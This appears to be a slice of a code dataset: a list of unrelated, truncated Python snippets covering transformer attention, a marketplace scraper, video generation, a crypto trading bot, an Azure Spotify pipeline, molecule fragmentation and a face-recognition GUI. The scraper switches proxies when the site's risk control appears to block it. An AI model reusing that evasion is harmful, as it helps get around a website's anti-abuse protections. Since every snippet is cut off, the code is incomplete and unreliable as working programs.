self.q_bn(q_conv_out).reshape(T, B, C, N).contiguous()  # T B C N\n        q_conv_out = self.q_lif(q_conv_out.flatten(0, 1)).reshape(T, B, C, N)  # TB C N\n        q = q_conv_out.reshape(T, B, N, self.num_heads, C // self.num_heads).permute(0, 1, 3, 2, 4).contiguous()\n\n        k_conv_out = self.k_conv(x_for_qkv)\n        k_conv_out = self.k_bn(k_conv_out).reshape(T, B, C, N).contiguous()\n        k_conv_out = self.k_lif(k_conv_out.flatten(0, 1)).reshape(T, B, C, N)  # TB C N\n        k = k_conv_out.reshape(T, B, N, self.num_heads, C // self.num_heads).permute(0, 1, 3, 2, 4).contiguous()\n\n        v_conv_out = self.v_conv(x_for_qkv)\n        v_conv_out = self.v_bn(v_conv_out).reshape(T, B, C, N).contiguous()\n        v_conv_out = self.v_lif(v_conv_out.flatten(0, 1)).reshape(T, B, C, N)  # TB C N\n        v = v_conv_out.reshape(T, B, N, self.num_heads, C // self.num_heads).permute(0, 1, 3, 2, 4).contiguous()\n\n\n        # Spike-driven Transformer attention\n        kv = k.mul(v)\n        kv = kv.sum(dim=-2, keepdim=True)\n        kv = self.sd_lif(kv)\n\n        x = q.mul(kv)\n\n        x = x.transpose(3,4).reshape(T, B, C, N).contiguous() # T B C N\n        # ignore following lines for membrane shortcut\n        # x = self.attn_lif(x.flatten(0,1)) #[TB] C N\n        # x = self.proj_lif(self.proj_bn(self.proj_conv(x))).reshape(T, B, C, N) #T B C N\n        r",
    "from time import sleep\nfrom click import command, option, Choice\nimport mysql_database\nimport sqlite_database\nfrom access import access\nfrom clash_proxy import proxy\n\nCATEGORY_MAP = {\n    \"all\": \"\",\n    \"fig\": \"2312\",\n    \"model\": \"2066\",\n    \"peri\": \"2331\",\n    \"3C\": \"2273\",\n    \"gacha\": \"fudai_cate_id\",\n}\n\nSORT_MAP = {\n    \"\u65f6\u95f4\u964d\u5e8f\": \"TIME_DESC\",\n    \"\u4ef7\u683c\u5347\u5e8f\": \"PRICE_ASC\",\n    \"\u4ef7\u683c\u964d\u5e8f\": \"PRICE_DESC\",\n}\n\ndbs = []\n\ndef category2id(category: str):\n    return CATEGORY_MAP.get(category, \"\")\n\ndef sort2type(sort: str):\n    return SORT_MAP.get(sort, \"TIME_DESC\")\n\ndef pull(category: str, sort: str, db_type: str, use_proxy = False, show_item_info = False, keywords = [], shieldwords = []):\n    next_id = None\n    count = 0\n    count_item = 0\n    flag = True # \u8868\u793a\u5f53\u524d\u5546\u54c1\u662f\u5426\u4e3a\u672c\u5730\u6570\u636e\u5e93\u4e2d\u6ca1\u6709\u7684\u65b0\u5546\u54c1\n    count_reconnect = -1 # \u4e0a\u4e00\u6b21\u91cd\u8fde\u65f6\u7684 count\n    reconnect = 5 # \u5c1d\u8bd5\u91cd\u8fde\u7684\u6b21\u6570\n    cont = True # \u662f\u5426\u7ee7\u7eed\u8fd0\u884c\n\n    # \u9009\u62e9\u6570\u636e\u5e93\u7c7b\u578b\n    match db_type:\n        case \"sqlite\": dbs = [sqlite_database.DB(category, \"Bmarket.db\")]\n        case \"mysql\": dbs = [mysql_database.DB(category, \"./config.txt\")]\n        case \"both\": dbs = [sqlite_database.DB(category, \"Bmarket.db\"), mysql_database.DB(category, \"./config.txt\")]\n\n    # \u521d\u59cb\u5316\u4e0e\u5e02\u96c6\u7684\u8fde\u63a5\n    bmarket = access()\n    # \u521d\u59cb\u5316\u4ee3\u7406\n    if use_proxy: pxy = proxy(\"./config.txt\")\n\n    print(\"\u5f00\u59cb\u83b7\u53d6\u5546\u54c1\u4fe1\u606f...\")\n    while True:\n        try:\n            next_id, fetched = bmarket.fetch(next_id, category2id(category), sort2type(sort), keywords, shieldwords)\n            for item in fetched:\n                # flag = db.store(item, False)\n                for db in dbs: db.store(item, False)\n                if not flag: break\n                if show_item_info: print(item.info())\n            count_item += len(fetched)\n            if count_item % 100 == 0:\n                print(f\"\u5df2\u83b7\u53d6 {count_item} \u6761\u8bb0\u5f55\")\n            if not flag:\n                print(\"\u6ca1\u6709\u65b0\u5546\u54c1\u4e86...\")\n                break\n            if not next_id:\n                if count == 0: print(\"Cookie \u65e0\u6548\uff0c\u8bf7\u66f4\u65b0 Cookie...\")\n                else: print(\"\u6ca1\u6709\u66f4\u591a\u5546\u54c1\u4e86...\")\n                break\n            count += 1\n        except Exception as e:\n            if count_reconnect != count: # \u5982\u679c\u4e0a\u6b21\u91cd\u8fde\u540e\u6709\u83b7\u53d6\u5230\u6570\u636e\n                print(\"\u8fde\u63a5\u65ad\u5f00\uff0c\u53ef\u80fd\u89e6\u53d1\u98ce\u63a7\uff0c\u5c1d\u8bd5\u81ea\u52a8\u91cd\u8fde...\")\n                count_reconnect = count\n                reconnect_try = 0\n                # if use_proxy: pxy.change_proxy() # \u66f4\u6362\u4ee3\u7406\n            else: # \u8fde\u7eed\u51fa\u73b0\u91cd\u8fde\u5931\u8d25\n                reconnect_try += 1\n            if reconnect_try >= reconnect:\n                if use_proxy:\n                    print(\"\u81ea\u52a8\u91cd\u8fde\u5931\u8d25\uff0c\u5c1d\u8bd5\u5207\u6362\u4ee3\u7406...\")\n                    msg = pxy.change_proxy() # \u66f4\u6362\u4ee3\u7406\n                    if msg == \"ok\":\n                        print(f\"\u5207\u6362\u5230\u4ee3\u7406 '{pxy.now_proxy}'\")\n                        continue\n                    else: print(msg)\n                while True:\n                    if use_proxy: print(\"\u5207\u6362\u4ee3\u7406\u5931\u8d25\uff0c\u8bf7\u9009\u62e9\u63a5\u4e0b\u6765\u7684\u64cd\u4f5c...\")\n                    else: print(\"\u81ea\u52a8\u91cd\u8fde\u5931\u8d25\uff0c\u8bf7\u9009\u62e9\u63a5\u4e0b\u6765\u7684\u64cd\u4f5c...\")\n                    print(\"c  \u518d\u6b21\u5c1d\u8bd5\u8fde\u63a5\")\n                    print(\"q  \u9000\u51fa\u7a0b\u5e8f\uff0c\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\")\n                    s = input()\n                    match s:\n                        case \"c\":\n                            print(\"\u7ee7\u7eed\u83b7\u53d6\u5546\u54c1\u4fe1\u606f...\")\n                            cont = True\n                            break\n                        case \"q\":\n                            print(\"\u9000\u51fa\u7a0b\u5e8f...\")\n                            cont = False\n                            break\n            if not cont: break # \u7ed3\u675f\u5916\u5c42\u5faa\u73af\n            sleep(1) # \u91cd\u8fde\u95f4\u9694\uff0c\u7b49\u5f851\u79d2\u540e\u91cd\u8fde\n    for db in dbs: db.disconnect()\n\ndef merge(category: str, sort: str, db_type: str, use_proxy = False, show_item_info = False, keywords = [], shieldwords = []):\n    next_id = None\n    count = 0\n    count_item = 0\n    count_reconnect = -1 # \u4e0a\u4e00\u6b21\u91cd\u8fde\u65f6\u7684 count\n    reconnect = 5 # \u5c1d\u8bd5\u91cd\u8fde\u7684\u6b21\u6570\n    cont = True # \u662f\u5426\u7ee7\u7eed\u8fd0\u884c\n\n    # \u9009\u62e9\u6570\u636e\u5e93\u7c7b\u578b\n    global dbs\n    match db_type:\n        case \"sqlite\": dbs = [sqlite_database.DB(category, \"Bmarket.db\")]\n        case \"mysql\": dbs = [mysql_database.DB(category, \"./config.txt\")]\n        case \"both\": dbs = [sqlite_database.DB(category, \"Bmarket.db\"), mysql_database.DB(category, \"./config.txt\")]\n\n    # \u521d\u59cb\u5316\u4e0e\u5e02\u96c6\u7684\u8fde\u63a5\n    bmarket = access()\n    # \u521d\u59cb\u5316\u4ee3\u7406\n    if use_proxy: pxy = proxy(\"./config.txt\")\n\n    print(\"\u5f00\u59cb\u83b7\u53d6\u5546\u54c1\u4fe1\u606f...\")\n    while True:\n        try:\n            next_id, fetched = bmarket.fetch(next_id, category2id(category), sort2type(sort), keywords, shieldwords)\n            for item in fetched:\n                for db in dbs: db.note(item)\n                if show_item_info: print(item.info())\n            count_item += len(fetched)\n            if count_item % 100 == 0:\n                print(f\"\u5df2\u83b7\u53d6 {count_item} \u6761\u8bb0\u5f55\")\n            if not next_id:\n                if count == 0: print(\"Cookie \u65e0\u6548\uff0c\u8bf7\u66f4\u65b0 Cookie...\")\n                else:\n                    print(\"\u6ca1\u6709\u66f4\u591a\u4e86...\")\n                    for db in dbs:\n                        db.remove_invalid()\n                        db.flush_new()\n                break\n            count += 1\n        except Exception as e:\n            if count_reconnect != count: # \u5982\u679c\u4e0a\u6b21\u91cd\u8fde\u540e\u6709\u83b7\u53d6\u5230\u6570\u636e\n                print(\"\u8fde\u63a5\u65ad\u5f00\uff0c\u53ef\u80fd\u89e6\u53d1\u98ce\u63a7\uff0c\u5c1d\u8bd5\u81ea\u52a8\u91cd\u8fde...\")\n            ",
    "import os\nimport random\nfrom moviepy.video.tools.subtitles import SubtitlesClip\nfrom moviepy.editor import VideoFileClip, AudioFileClip, TextClip, CompositeVideoClip, CompositeAudioClip, ImageClip\nimport pysrt\nimport json\n\n\ndef add_image(video_clip, image_path):\n    image = ImageClip(image_path)\n    image = image.set_duration(5)\n    image = image.set_position(\"center\")\n    # Overlay the image onto the video\n    video_clip = CompositeVideoClip([video_clip, image.set_start(0)])  # Start the image at the beginning\n    return video_clip\n\ndef crop_to_vertical(video_clip):    \n    # Original dimensions\n    original_width, original_height = video_clip.size\n    \n    # Calculate the new width while maintaining the 9:16 aspect ratio\n    new_width = int((9 / 16) * original_height)\n    \n    # Ensure the new width is not greater than the original width\n    new_width = min(new_width, original_width)\n    \n    # Calculate the left and right margins to crop evenly\n    left_margin = (original_width - new_width) / 2\n    right_margin = original_width - left_margin\n    \n    # Crop the video. moviepy's crop method: crop(x1, y1, x2, y2)\n    cropped_clip = video_clip.crop(x1=left_margin, y1=0, x2=right_margin, y2=original_height)\n    \n    return cropped_clip\n\ndef create_video_with_audio_and_subtitles(srt_path, image_path, audio_path, output_path, video_folder=\"templateGamePlayVideos\"):\n    # List all videos in the folder\n    videos = [os.path.join(video_folder, f) for f in os.listdir(video_folder) if f.endswith(('.mp4', '.avi'))]\n    \n    # srt_path = pysrt.open(srt_path)\n\n    # Choose a random video\n    video_path = random.choice(videos)\n    video_clip = VideoFileClip(video_path)\n\n    # Load the audio file\n    audio_clip = AudioFileClip(audio_path)\n\n    # Assuming we want the video clip to match the duration of the audio clip\n    video_duration = audio_clip.duration\n    start_time = random.uniform(0, max(0, video_clip.duration - video_duration))\n    video_clip = video_clip.subclip(start_time, start_time + video_duration)\n\n    # Set the audio of the video clip to be the audio clip\n    video_clip = video_clip.set_audio(CompositeAudioClip([video_clip.audio.volumex(0.13), audio_clip]))\n\n    video_clip = crop_to_vertical(video_clip)\n\n\n    generator = lambda txt: TextClip(txt, fontsize=36, font='Helvetica-Bold', color='yellow', bg_color=\"blue\", method=\"caption\")\n\n    # sub_clips = [make_subtitle_clip(sub) for sub in subs]\n\n    subtitles = SubtitlesClip(srt_path, generator)\n\n    subtitles = subtitles.set_position('center', 'bottom')\n\n    video_clip = CompositeVideoClip([video_clip, subtitles], size=video_clip.size)\n\n    video_clip = add_image(video_clip, image_path)\n\n    ## Overlay the text clip on the first video clip\n    # final_clip = CompositeVideoClip([video_clip, txt_clip])\n\n    # Write the result to a file\n    # video_clip.write_videofile(output_path, codec=\"libx264\", fps=24, bitrate=\"10000k\", preset=\"veryslow\")\n    video_clip.write_videofile(output_path, codec=\"mpeg4\", fps=24, bitrate=\"10000k\", preset=\"veryslow\")\n\n\ndef generate_videos(title, audio_paths, image_paths, srt_paths):\n    video_paths = []\n    for i in range(len(audio_paths)):  # len(audio_paths) = len(image_paths)\n        if (os.stat(srt_paths[i]).st_size == 0):\n            continue\n        video_path = f\"./generatedVideos/{title}{i}.mov\"\n        create_video_with_audio_and_subtitles(srt_paths[i], image_paths[i], audio_paths[i], video_path)\n        video_paths.append(video_path)\n    return video_paths\n",
    "# crypto trading bot code by bitopsy.com published APRIL 1 2024\n\n# 1. add you API keys from binance\n# 2. choose any pair of cryptos or stocks\n# 3. uncomment the buy and sell calls when you are ready to trade otherwise it will only simulate\n# 4. (optional) change the parameters to taste\n# 5. use responsibly. We are not financial advisors and we are not resbonsible for any loss\n\n\n# Replace with your Binance API key and secret\napi_key = #your public api here from binance\napi_secret = #your secret api here from binance\n\n\nfrom binance.client import Client\nimport ta\nimport time\nimport pandas as pd\nfrom sklearn.ensemble import RandomForestRegressor\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.metrics import mean_squared_error\nimport numpy as np\n\n# Initialize Binance client\nclient = Client(api_key, api_secret)\n\n# Trading pair and parameters\nimport sys\ntrading_pair = 'SOLUSDT' #change this to whatever crypto or stock you are interested in trading\nbtc_pair = 'BTCUSDT'\n\nass = trading_pair[:-4]\n\nbb_window = 21\nbb_std_dev = 2\nmacd_slow = 26\nmacd_fast = 12\nmacd_signal = 9\nrsi_period = 14\nrsi_overbought = 70\nrsi_oversold = 30\nrf_window = 60  # Window size for Random Forest\n\n\n\n# Function to get the current price\ndef get_current_price(symbol):\n    ticker = client.get_ticker(symbol=symbol)\n    return float(ticker['lastPrice'])\n\n# Function to place a buy order\ndef buy(symbol, quantity):\n    order = client.order_market_buy(symbol=symbol, quantity=quantity)\n    print(f\"Buy order placed for {symbol}: {order}\")\n\n# Function to place a sell order\ndef sell(symbol, quantity):\n    order = client.order_market_sell(symbol=symbol, quantity=quantity)\n    print(f\"Sell order placed for {symbol}: {order}\")\n\n# Main trading loop\nwhile True:\n    # Get historical OHLCV data\n    klines = client.get_historical_klines(symbol=trading_pair, interval=Client.KLINE_INTERVAL_1MINUTE)\n    btc_klines = client.get_historical_klines(symbol=btc_pair, interval=Client.KLINE_INTERVAL_1MINUTE)\n\n\n    # Get current price\n    current_price = get_current_price(trading_pair)\n\n    # Calculate RSI\n    closes = [float(kline[4]) for kline in klines]\n    btc_closes = [float(kline[4]) for kline in btc_klines]\n\n    \n\n    closes_series = pd.Series(closes)  # Convert list to pandas Series\n    btc_closes_series = pd.Series(btc_closes)\n\n    rsi_values = ta.momentum.rsi(closes_series, window=rsi_period)\n    current_rsi = rsi_values.iloc[-1]  # Get the last RSI value\n    print(\"## RSI current price and RSIi/overbought\", current_price, rsi_oversold,\"<\",current_rsi,\"<\",rsi_overbought)\n\n    # Calculate Bollinger Bands\n    bb_indicator = ta.volatility.BollingerBands(closes_series, window=bb_window, window_dev=bb_std_dev)\n    bb_lower = bb_indicator.bollinger_lband().iloc[-1]\n    bb_upper = bb_indicator.bollinger_hband().iloc[-1]\n\n    # Calculate MACD\n    macd = ta.trend.MACD(closes_series)\n    macd_line = macd.macd().iloc[-1]\n    macd_signal_line = macd.macd_signal().iloc[-1]\n\n\n    # Prepare data for Random Forest\n    X = []\n    y = []\n    for i in range(rf_window, len(closes)):\n        X.append(list(closes[i - rf_window:i])+ list(btc_closes[i - rf_window:i]))\n        y.append(closes[i])\n\n    X = np.array(X)  # Convert list to NumPy array\n\n    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\n    # Train Random Forest Regressor\n    rf_model = RandomForestRegressor(n_estimators=100, random_state=42)\n    rf_model.fit(X_train, y_train)\n\n    # Predict the next price using Random Forest\n    next_price_pred = rf_model.predict([X_test[-1]])\n    print(\"## RF current price and predicted price\", current_price, next_price_pred)\n\n\n\n\n    # Check trading conditions\n    if current_rsi > rsi_overbought:\n        # Sell condition\n        balance = client.get_asset_balance(asset=ass)\n        sell_quantity = float(balance['free'])\n        if sell_quantity > 0:\n            print(\"\\nRSI sell\", sell_quantity )\n            #sell(trading_pair, sell_quantity)\n    elif current_rsi < rsi_oversold:\n        # Buy condition\n        usdt_balance = client.get_asset_balance(asset='USDT')\n        buy_amount = float(usdt_balance['free'])\n        if buy_amount > 0:\n            buy_quantity = buy_amount / current_price\n            print(\"\\nRSI buy amount\",buy_amount, \"price\", current_price, \"total:\",(buy_amount / current_price))\n            #buy(trading_pair, buy_quantity)\n    print(\"## BOL\",bb_upper,\"<\",current_price,\"<\", bb_lower)\n    print(\"## MACD MACD_line:\", macd_line, \">\" ,macd_signal_line)\n    # Check trading conditions\n    if current_price < bb_lower and macd_line > macd_signal_line:\n        # Buy condition\n        usdt_balance = client.get_asset_balance(asset='USDT')\n        buy_amount = float(usdt_balance['free'])\n        if buy_amount > 0:\n            buy_quantity = buy_amount / current_price\n            print(\"\\nMACD/BOL buy amount\",buy_amount, \"price\", current_price, \"total:\",(buy_amount / current_price))\n            #buy(trading_pair, buy_quantit",
    "import torch\nimport numpy as np\nimport math\nfrom scipy.stats import ortho_group\nimport torch.nn.functional as F\n\n\n### generate random vectors for input data from gaussian distribution\ndef generate_random_vec(num, dim, mean = None, std = None):\n    if mean is None:\n        mean = torch.zeros(dim)\n    if std is None:\n        std = torch.ones(dim)\n    return (torch.randn(num, dim) * std + mean).float()\n\n# generate random vectors follow https://arxiv.org/abs/1711.05174 \ndef generate_random_vec_zeyuan(num, dim):\n    # generate num*dim orthonormal matrix U\n    p = dim//2\n    n2 = num // 2\n    \n    U1 = ortho_group.rvs(n2)[:, :p]\n    V1 = ortho_group.rvs(p)\n    S1 = np.diag(np.array([1.0 / (i + 1) for i in range(p)]))\n    X1 = U1 @ S1 @ V1\n    \n    U2 = ortho_group.rvs(n2)[:, :p]\n    V2 = ortho_group.rvs(p)\n    S2 = np.diag(np.array([2.0 / (i + 10) for i in range(p)]))\n    X2 = U2 @ S2 @ V2\n    \n    ### X = [X1 0; 0 X2] block matrix\n    X = np.zeros((num, dim))\n    X[:n2, :p] = X1\n    X[n2:, p:] = X2\n    \n    return torch.tensor(X)\n\n### generate sparse random matrix\ndef sparse_random_matrix(dim1, dim2, sparsity_ratio = 0.01):\n    with torch.no_grad():\n        A = torch.randn(dim1, dim2)\n        A = F.dropout(A, p = 1 - sparsity_ratio)\n        \n    return A\n\n\n# modified from https://arxiv.org/abs/1711.05174, randn can generate almost orthogonal matrix when dim is large\ndef generate_random_vec_fast_zeyuan(num, dim):\n    # generate num*dim orthonormal matrix U\n    p = dim//2\n    n2 = num // 2\n    \n    U1 = torch.randn(n2, p)\n    V1 = torch.randn(p, p)\n    S1 = torch.diag(torch.tensor([1.0 / (i + 1) for i in range(p)]))\n    X1 = U1 @ S1 @ V1\n    \n    U2 = torch.randn(n2, p)\n    V2 = torch.randn(p, p)\n    S2 = torch.diag(torch.tensor([1.0 / (i + 1) for i in range(p)]))\n    X2 = U2 @ S2 @ V2\n    \n    ### X = [X1 0; 0 X2] block matrix\n    X = np.zeros((num, dim))\n    X[:n2, :p] = X1\n    X[n2:, p:] = X2\n    \n    return torch.tensor(X)\n",
    "import os\nimport logging\nimport json\nimport spotipy\nfrom spotipy.oauth2 import SpotifyClientCredentials\nimport azure.functions as func\nfrom azure.storage.filedatalake import DataLakeServiceClient\nfrom azure.storage.blob import BlobServiceClient\nfrom datetime import datetime\nfrom io import StringIO\nimport pandas as pd\n\napp = func.FunctionApp()\n\n# Retrieve environment variables\nspotify_client_id = os.environ.get(\"SPOTIFY_CLIENT_ID\")\nspotify_client_secret = os.environ.get(\"SPOTIFY_CLIENT_SECRET\")\nstorage_account_name = os.environ.get(\"STORAGE_ACCOUNT_NAME\")\nstorage_account_key = os.environ.get(\"STORAGE_ACCOUNT_KEY\")\nstorage_connection_string = os.environ.get(\"STORAGE_CONNECTION_STRING\")\nstorage_container = os.environ.get(\"STORAGE_CONTAINER\")\n\n\n@app.timer_trigger(\n    arg_name=\"myTimer\",\n    schedule=\"0 * * * *\"\n)\ndef spotify_data_extract(myTimer: func.TimerRequest) -> None:\n    \"\"\"Extracts data from the Spotify API and stores it in Azure Data Lake Storage Gen2.\n\n    Args:\n        myTimer (func.TimerRequest): The timer trigger object.\n\n    Returns:\n        None\n    \"\"\"\n    try:\n        # Initialize Spotify client\n        credentials = SpotifyClientCredentials(client_id=spotify_client_id, client_secret=spotify_client_secret)\n        spotify = spotipy.Spotify(client_credentials_manager=credentials)\n\n        # Fetch data from Spotify playlist\n        playlist_id = \"37i9dQZEVXbNG2KDcFcKOF\"\n        spotify_data = spotify.playlist_tracks(playlist_id)\n\n        # Initialize ADLS Gen2 client and get file system client\n        account_url = f\"https://{storage_account_name}.dfs.core.windows.net\"\n        service_client = DataLakeServiceClient(account_url=account_url, credential=storage_account_key)\n        file_system_client = service_client.get_file_system_client(file_system=storage_container)\n\n        # Create or get file client\n        timestamp = datetime.now().strftime(\"%Y-%m-%d_%H:%M:%S\")\n        file_name = f\"raw_data/to_processed/spotify_data_{timestamp}.json\"\n        file_client = file_system_client.get_file_client(file_name)\n\n        # Upload the data\n        file_client.upload_data(json.dumps(spotify_data), overwrite=True)\n\n        logging.info(f\"Successfully uploaded data to {file_name}\")\n\n        return None\n    except Exception as e:\n        logging.exception(f\"An error occurred during data extraction: {str(e)}\")\n\n\n@app.blob_trigger(\n    arg_name=\"myblob\",\n    path=storage_container + \"/raw_data/to_processed/{name}.json\",\n    connection=\"STORAGE_CONNECTION_STRING\"\n)\ndef spotify_data_transformation_load(myblob: func.InputStream):\n    \"\"\"Transforms and loads Spotify data stored in Azure Data Lake Storage Gen2.\n\n    Args:\n        myblob (func.InputStream): The input blob trigger.\n\n    Returns:\n        None\n    \"\"\"\n    spotify_data = process_blobs(storage_connection_string, storage_container)\n    album_df, artist_df, song_df = transform_data(spotify_data)\n\n    # Initialize ADLS Gen2 client and get file system client\n    account_url = f\"https://{storage_account_name}.dfs.core.windows.net\"\n\n    # Directly use the storage account key for authentication\n    service_client = DataLakeServiceClient(account_url=account_url, credential=storage_account_key)\n    file_system_client = service_client.get_file_system_client(file_system=storage_container)\n\n    # Format timestamp for filename\n    timestamp = datetime.now().strftime(\"%Y-%m-%d_%H-%M-%S\")\n\n    # Upload songs, album, artists to transformed_data directories\n    load_dataframe_to_adls(song_df, file_system_client, f\"transformed_data/songs_data/song_transformed_{timestamp}.csv\")\n    load_dataframe_to_adls(album_df, file_system_client, f\"transformed_data/album_data/album_transformed_{timestamp}.csv\")\n    load_dataframe_to_adls(artist_df, file_system_client, f\"transformed_data/artist_data/artist_transformed_{timestamp}.csv\")\n\n    # Move the raw_data from to_processed to processed\n    copy_files_and_cleanup(file_system_client, \"raw_data/to_processed\", \"raw_data/processed\")\n\n\ndef process_blobs(storage_connection_string, storage_container):\n    \"\"\"Processes Spotify data blobs stored in Azure Data Lake Storage Gen2.\n\n    Args:\n        storage_connection_string (str): The connection string to the storage account.\n        storage_container (str): The name of the storage container.\n\n    Returns:\n        list: A list of Spotify data extracted from blobs.\n    \"\"\"\n    blob_service_client = BlobServiceClient.from_connection_string(conn_str=storage_connection_string)\n    container_client = blob_service_client.get_container_client(container=storage_container)\n    file_prefix = \"/raw_data/to_processed/spotify_data\"\n    spotify_data = []\n\n    for blob in container_client.list_blobs(name_starts_with=file_prefix):\n        if blob.name.endswith(\".json\"):\n            logging.info(f\"Processing {blob.name}\")\n\n            # Retrieve the blob's content\n            blob_client = container_client.get_blob_client(blob.name)\n            blob_content = blob_client.download_blob().readall()\n          ",
    "from DeepFMPO.global_parameters import MOL_SPLIT_START, MAX_FREE, MAX_ATOMS, MAX_FRAGMENTS\r\nfrom rdkit import Chem\r\nfrom tqdm import tqdm\r\nimport numpy as np\r\n\r\n# Main module for handleing the interactions with molecules\r\n\r\n\r\n# Atom numbers of noble gases (should not be used as dummy atoms)\r\nNOBLE_GASES = set([2, 10, 18, 36, 54, 86])\r\nng_correction = set()\r\n\r\n\r\n# Drop salt from SMILES string\r\ndef drop_salt(s):\r\n    s = s.split(\".\")\r\n    return [x for _, x in sorted(zip(map(len, s), s), reverse=True)][0]\r\n\r\n\r\n# Check if it is ok to break a bond.\r\n# It is ok to break a bond if:\r\n#    1. It is a single bond\r\n#    2. Either the start or the end atom is in a ring, but not both of them.\r\ndef okToBreak(bond):\r\n    if bond.IsInRing():\r\n        return False\r\n\r\n    if bond.GetBondType() != Chem.rdchem.BondType.SINGLE:\r\n        return False\r\n\r\n    begin_atom = bond.GetBeginAtom()\r\n    end_atom = bond.GetEndAtom()\r\n\r\n    if not (begin_atom.IsInRing() or end_atom.IsInRing()):\r\n        return False\r\n    elif begin_atom.GetAtomicNum() >= MOL_SPLIT_START or \\\r\n            end_atom.GetAtomicNum() >= MOL_SPLIT_START:\r\n        return False\r\n    else:\r\n        return True\r\n\r\n\r\n# Divide a molecule into fragments\r\ndef split_molecule(mol):\r\n    split_id = MOL_SPLIT_START\r\n\r\n    res = []\r\n    to_check = [mol]\r\n    while len(to_check) > 0:\r\n        ms = spf(to_check.pop(), split_id)\r\n        if len(ms) == 1:\r\n            res += ms\r\n        else:\r\n            to_check += ms\r\n            split_id += 1\r\n    return create_chain(res)\r\n\r\n\r\n# Function for doing all the nitty gritty splitting work.\r\ndef spf(mol, split_id):\r\n    bonds = mol.GetBonds()\r\n    for i in range(len(bonds)):\r\n        if okToBreak(bonds[i]):\r\n            mol = Chem.FragmentOnBonds(mol, [i], addDummies=True, dummyLabels=[(0, 0)])\r\n            # Dummy atoms are always added last\r\n            n_at = mol.GetNumAtoms()\r\n            mol.GetAtomWithIdx(n_at - 1).SetAtomicNum(split_id)\r\n            mol.GetAtomWithIdx(n_at - 2).SetAtomicNum(split_id)\r\n            return Chem.rdmolops.GetMolFrags(mol, asMols=True)\r\n\r\n    # If the molecule could not been split, return original molecule\r\n    return [mol]\r\n\r\n\r\n# Build up a chain of fragments from a molecule.\r\n# This is required so that a given list of fragments can be rebuilt into the same\r\n#   molecule as was given when splitting the molecule\r\ndef create_chain(splits):\r\n    splits_ids = \\\r\n        [sorted([a.GetAtomicNum() for a in m.GetAtoms()\r\n                 if a.GetAtomicNum() >= MOL_SPLIT_START]) for m in splits]\r\n    splits2 = []\r\n    mv = np.max(splits_ids)\r\n    look_for = [mv if isinstance(mv, np.int64) else mv[0]]\r\n    join_order = []\r\n\r\n    mols = []\r\n\r\n    for i in range(len(splits_ids)):\r\n        l = splits_ids[i]\r\n        if len(l) == 1 and l[0] == look_for[0]:\r\n            mols.append(splits[i])\r\n            splits2.append(splits_ids[i])\r\n            splits_ids[i] = []\r\n\r\n    while len(look_for) > 0:\r\n        sid = look_for.pop()\r\n        join_order.append(sid)\r\n        next_mol = [i for i in range(len(splits_ids))\r\n                    if sid in splits_ids[i]]\r\n\r\n        if len(next_mol) == 0:\r\n            break\r\n        next_mol = next_mol[0]\r\n\r\n        for n in splits_ids[next_mol]:\r\n            if n != sid:\r\n                look_for.append(n)\r\n        mols.append(splits[next_mol])\r\n        splits2.append(splits_ids[next_mol])\r\n        splits_ids[next_mol] = []\r\n\r\n    return [simplify_splits(mols[i], splits2[i], join_order) for i in range(len(mols))]\r\n\r\n\r\n# Split and keep track of the order on how to rebuild the molecule\r\ndef simplify_splits(mol, splits, join_order):\r\n    td = {}\r\n    n = 0\r\n    for i in splits:\r\n        for j in join_order:\r\n            if i == j:\r\n                td[i] = MOL_SPLIT_START + n\r\n                n += 1\r\n                if n in NOBLE_GASES:\r\n                    n += 1\r\n\r\n    for a in mol.GetAtoms():\r\n        k = a.GetAtomicNum()\r\n        if k in td:\r\n            a.SetAtomicNum(td[k])\r\n\r\n    return mol\r\n\r\n\r\n# Go through a molecule and find attachment points and define in which order they should be re-joined.\r\ndef get_join_list(mol):\r\n    join = []\r\n    rem = []\r\n    bonds = []\r\n\r\n    for a in mol.GetAtoms():\r\n        an = a.GetAtomicNum()\r\n        if an >= MOL_SPLIT_START:\r\n            while len(join) <= (an - MOL_SPLIT_START):\r\n                rem.append(None)\r\n                bonds.append(None)\r\n                join.append(None)\r\n\r\n            b = a.GetBonds()[0]\r\n            ja = b.GetBeginAtom() if b.GetBeginAtom().GetAtomicNum() < MOL_SPLIT_START else \\\r\n                b.GetEndAtom()\r\n            join[an - MOL_SPLIT_START] = ja.GetIdx()\r\n            rem[an - MOL_SPLIT_START] = a.GetIdx()\r\n            bonds[an - MOL_SPLIT_START] = b.GetBondType()\r\n            a.SetAtomicNum(0)\r\n\r\n    return [x for x in join if x is not None], \\\r\n           [x for x in bonds if x is not None], \\\r\n           [x for x in rem if x is not None]\r\n\r\n\r\n# Join a list of fragments toghether into a molecu",
    "from tkinter import*\r\nfrom tkinter import ttk\r\nfrom PIL import Image,ImageTk\r\nfrom tkinter import messagebox\r\nimport mysql.connector\r\nimport cv2\r\nimport os\r\nimport numpy as np\r\n\r\n\r\nclass Student:\r\n    def __init__(self,root):\r\n        self.root=root\r\n        self.root.geometry(\"1300x790+0+0\")\r\n        self.root.title(\"face Recognition System\")\r\n        \r\n        \r\n        #================= variables=========\r\n        self.var_dep=StringVar()\r\n        self.var_course=StringVar()\r\n        self.var_year=StringVar()\r\n        self.var_semester=StringVar()\r\n        self.va_std_id=StringVar()\r\n        self.var_std_name=StringVar()\r\n        self.var_div=StringVar()\r\n        self.var_roll=StringVar()\r\n        self.var_gender=StringVar()\r\n        self.var_dob=StringVar()\r\n        self.var_email=StringVar()\r\n        self.var_phone=StringVar()\r\n        self.var_address=StringVar()\r\n        self.var_teacher=StringVar()\r\n        \r\n        #1st \r\n        img=Image.open(r\"college_images\\a5.jpg\")\r\n        img=img.resize((500,130),Image.ANTIALIAS)\r\n        self.photoimg=ImageTk.PhotoImage(img)\r\n        \r\n        f_lbl=Label(self.root,image=self.photoimg)\r\n        f_lbl.place(x=0,y=0,width=500,height=130)\r\n        \r\n        #2nd\r\n        img1=Image.open(r\"college_images\\a4.jpg\")\r\n        img1=img1.resize((500,130),Image.ANTIALIAS)\r\n        self.photoimg1=ImageTk.PhotoImage(img1)\r\n        \r\n        f_lbl=Label(self.root,image=self.photoimg1)\r\n        f_lbl.place(x=500,y=0,width=500,height=130)\r\n        \r\n        #3rd\r\n        img2=Image.open(r\"college_images\\a2.jpg\")\r\n        img2=img2.resize((550,130),Image.ANTIALIAS)\r\n        